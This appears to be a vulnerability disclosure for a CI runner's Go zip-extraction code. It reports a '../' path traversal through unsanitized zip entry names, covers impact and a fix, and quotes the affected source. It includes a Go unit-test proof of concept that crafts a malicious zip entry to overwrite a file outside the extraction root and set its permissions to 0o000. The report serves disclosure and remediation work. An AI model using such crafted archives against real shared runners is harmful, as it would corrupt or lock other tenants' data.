### Title
Zip archive extraction (`ExtractZipArchive`) applies file writes and `lchmod` to unsanitized `zip.File.Name` paths, allowing `../` path traversal outside the extraction root - (File: `helpers/archives/zip_extract.go`)

### Summary
`ExtractZipArchive` in `helpers/archives/zip_extract.go` and its helper `extractZipFile`/`lchmod` (in `helpers/archives/os_unix.go`) use `file.Name` directly as a filesystem path with no containment check against the intended extraction root. Any job that can supply a zip (cache or artifact) with `FileHeader.Name` containing `../` segments can cause both file creation/removal and `Fchmodat`-based permission changes outside the working directory the extractor was invoked in.

### Finding Description
`extractZipFile` builds paths straight from `file.Name`: [1](#0-0) 
and then dispatches to `extractZipDirectoryEntry`/`extractZipSymlinkEntry`/`extractZipFileEntry`, all of which call `os.Mkdir`, `os.Remove`, `os.Symlink`, or `os.OpenFile` directly on `file.Name`: [2](#0-1) 

The only guard applied is `errorIfGitDirectory`, which only rejects paths whose first cleaned segment is `.git` — it does nothing to stop `../` traversal: [3](#0-2) 

In the second pass, `lchmod(file.Name, file.Mode())` is called with the same unsanitized name and applies `unix.Fchmodat(unix.AT_FDCWD, name, ...)` relative to the process's current working directory: [4](#0-3) [5](#0-4) 

This is reachable from job-controlled inputs: `ExtractZipFile` → `ExtractZipArchive` is invoked by the legacy zip extractor used for cache/artifact extraction: [6](#0-5) 
Notably, the `ziplegacy` extractor accepts a `dir` field but never uses it to confine or join extraction paths — it passes the raw `zip.Reader` straight into `ExtractZipArchive`, unlike the sibling `tarzstd` extractor, which explicitly computes `filepath.Abs(filepath.Join(e.dir, hdr.Name))` and rejects any path not prefixed by `e.dir`: [7](#0-6) 

`cache-extractor` invokes the extractor with `wd = os.Getwd()` as the target directory, and the actual extraction happens relative to that working directory with no join/containment applied for zip archives: [8](#0-7) 

Since a job controls the cache/artifact zip content it uploads (and that same content is later downloaded/extracted by the runner for cache restore, or by artifact download commands using the same `ExtractZipArchive` path), an attacker can craft a `zip.File.Name` such as `../../other-project-cache/marker` or any traversal path relative to the extraction cwd. Both the first pass (`os.OpenFile`/`os.Remove`/`os.Symlink`/`os.MkdirAll(filepath.Dir(...))`) and the second pass (`lchmod`/`Fchmodat`) will follow that traversal outside the intended root, with no path validation, overwrite guard, or chroot/jail in the zip-specific code path.

### Impact Explanation
An unprivileged job can chmod (and, via the first extraction pass, create/overwrite/symlink) arbitrary files reachable from the process's working directory tree via relative traversal, without any restriction to the job's own cache/artifact extraction root. Concretely this means permission tampering (`Fchmodat`) and file/symlink writes on paths outside the job's designated cache directory — e.g., sibling cache directories for other projects/pipelines stored under the same shared cache root on the runner host, if their relative layout is guessable or already known to the attacker. This can corrupt or make inaccessible another tenant's cached data (permission bits changed, files overwritten/replaced with symlinks), which is a concrete cross-tenant integrity/availability impact within Runner's own extraction logic — independent of any privileged-container or shared-host executor caveat, since the bug is in Runner's own archive code, not in the executor sandbox boundary.

### Likelihood Explanation
Feasibility is high: the only precondition is that the attacker controls the CI job configuration (which any pipeline author does) and can produce a cache/artifact zip with crafted `FileHeader.Name` entries (trivially done with Go's `archive/zip` package or manual archive construction, since zip's on-disk format has no built-in path restriction). No authentication bypass or admin action is required — this is purely a missing input-validation bug in `ExtractZipArchive`/`extractZipFile`/`lchmod`, directly contrasting with the containment check already implemented for the tar/zstd extractor, confirming the gap is real and specific to the zip code path.

### Recommendation
Add the same containment check used in `tarzstd_extractor.go` to `zip_extract.go`: resolve each `file.Name` against the intended extraction root via `filepath.Join(root, file.Name)` followed by `filepath.Abs`, and reject (or skip with a warning, consistent with the existing `pathErrorTracker` pattern) any entry whose resolved path does not have the root as a prefix, before performing any `os.Mkdir`, `os.OpenFile`, `os.Symlink`, `os.Remove`, or `lchmod` call. This check must apply uniformly to both extraction passes in `ExtractZipArchive`, and `ziplegacy.extractor.Extract` should actually use its `dir` field to scope extraction instead of discarding it.

### Proof of Concept
Go unit test to add to `helpers/archives/zip_extract_test.go`:
```go
func TestExtractZipFilePathTraversal(t *testing.T) {
    tmpRoot := t.TempDir()
    extractDir := filepath.Join(tmpRoot, "victim-cache")
    require.NoError(t, os.MkdirAll(extractDir, 0o755))

    // Sibling directory representing "another project's" cache/checkout.
    outsideDir := filepath.Join(tmpRoot, "other-project")
    require.NoError(t, os.MkdirAll(outsideDir, 0o755))
    victimFile := filepath.Join(outsideDir, "victim.txt")
    require.NoError(t, os.WriteFile(victimFile, []byte("data"), 0o644))

    // Build a zip with a traversal entry that escapes extractDir into outsideDir.
    zipPath := filepath.Join(tmpRoot, "malicious.zip")
    zf, _ := os.Create(zipPath)
    zw := zip.NewWriter(zf)
    hdr := &zip.FileHeader{Name: "../other-project/victim.txt"}
    hdr.SetMode(0o000) // attempt to strip all permissions via lchmod
    w, _ := zw.CreateHeader(hdr)
    _, _ = w.Write([]byte("owned"))
    _ = zw.Close()
    _ = zf.Close()

    oldWd, _ := os.Getwd()
    require.NoError(t, os.Chdir(extractDir))
    defer os.Chdir(oldWd)

    err := ExtractZipFile(zipPath)
    require.NoError(t, err)

    // Assert the "victim" file outside extractDir was modified/chmod'd,
    // proving traversal outside the intended root.
    info, statErr := os.Stat(victimFile)
    require.NoError(t, statErr)
    assert.Equal(t, os.FileMode(0o000), info.Mode().Perm(), "lchmod escaped extraction root")
}
```
Expected (buggy) result: the test passes, showing `victim.txt` outside `extractDir` was overwritten and had its permissions changed to `0o000`, confirming both the write and `lchmod` phases of `ExtractZipArchive` escape the extraction root via `../` traversal.

### Citations

**File:** helpers/archives/zip_extract.go (L12-59)
```go
func extractZipDirectoryEntry(file *zip.File) (err error) {
	err = os.Mkdir(file.Name, file.Mode().Perm())

	// The "directory does exist" error is not an error for us
	if os.IsExist(err) {
		err = nil
	}
	return
}

func extractZipSymlinkEntry(file *zip.File) (err error) {
	var data []byte
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	data, err = io.ReadAll(in)
	if err != nil {
		return err
	}

	// Remove symlink before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	err = os.Symlink(string(data), file.Name)
	return
}

func extractZipFileEntry(file *zip.File) (err error) {
	var out *os.File
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	// Remove file before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	out, err = os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode().Perm())
	if err != nil {
		return err
	}
	defer func() { _ = out.Close() }()
	_, err = io.Copy(out, in)

	return
}
```

**File:** helpers/archives/zip_extract.go (L61-66)
```go
func extractZipFile(file *zip.File) (err error) {
	// Create all parents to extract the file
	err = os.MkdirAll(filepath.Dir(file.Name), 0o777)
	if err != nil {
		return err
	}
```

**File:** helpers/archives/zip_extract.go (L98-101)
```go
	for _, file := range archive.File {
		if err := lchmod(file.Name, file.Mode()); tracker.actionable(err) {
			logrus.Warningf("%s: %s (suppressing repeats)", file.Name, err)
		}
```

**File:** helpers/archives/path_check_helper.go (L13-19)
```go
func isPathAGitDirectory(path string) bool {
	parts := strings.Split(filepath.Clean(path), string(filepath.Separator))
	if len(parts) > 0 && parts[0] == ".git" {
		return true
	}
	return false
}
```

**File:** helpers/archives/os_unix.go (L12-28)
```go
func lchmod(name string, mode os.FileMode) error {
	var flags int

	if runtime.GOOS == "linux" {
		// Linux does not support changing modes on symlinks.
		if mode&os.ModeSymlink != 0 {
			return nil
		}
	} else {
		flags = unix.AT_SYMLINK_NOFOLLOW
	}

	err := unix.Fchmodat(unix.AT_FDCWD, name, uint32(mode.Perm()), flags)
	if err != nil {
		return &os.PathError{Op: "lchmod", Path: name, Err: err}
	}
	return nil
```

**File:** commands/helpers/archive/ziplegacy/zip_legacy_extractor.go (L24-32)
```go
// Extract extracts files from the reader to the directory passed to
// NewZipExtractor.
func (e *extractor) Extract(ctx context.Context) error {
	zr, err := zip.NewReader(e.r, e.size)
	if err != nil {
		return err
	}

	return archives.ExtractZipArchive(zr)
```

**File:** commands/helpers/archive/tarzstd/tarzstd_extractor.go (L57-64)
```go
		var path string
		path, err = filepath.Abs(filepath.Join(e.dir, hdr.Name))
		if err != nil {
			return err
		}
		if !strings.HasPrefix(path, e.dir+string(filepath.Separator)) && path != e.dir {
			return fmt.Errorf("%s cannot be extracted outside of chroot (%s)", path, e.dir)
		}
```

**File:** commands/helpers/cache_extractor.go (L626-663)
```go
	wd, err := os.Getwd()
	if err != nil {
		logrus.Fatalln("Unable to get working directory")
	}

	if c.File == "" {
		warningln("Missing cache file")
	}

	if c.URL != "" || c.GoCloudURL != "" {
		err := c.doRetry(c.download)
		if err != nil {
			warningln(err)
		}
	} else {
		logrus.Infoln(
			"No URL provided, cache will not be downloaded from shared cache server. " +
				"Instead a local version of cache will be extracted.")
	}

	f, size, format, err := openArchive(c.File)
	if os.IsNotExist(err) {
		warningln("Cache file does not exist")
	}
	if err != nil {
		logrus.Fatalln(err)
	}
	defer f.Close()

	extractor, err := archive.NewExtractor(format, f, size, wd)
	if err != nil {
		logrus.Fatalln(err)
	}

	err = extractor.Extract(context.Background())
	if err != nil {
		logrus.Fatalln(err)
	}
```
